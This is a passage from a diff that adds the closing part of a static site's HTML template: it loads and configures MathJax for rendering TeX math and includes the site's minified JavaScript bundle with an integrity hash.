+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+  MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+  });
+  MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+
+  MathJax.Hub.Config({
+  
+  TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
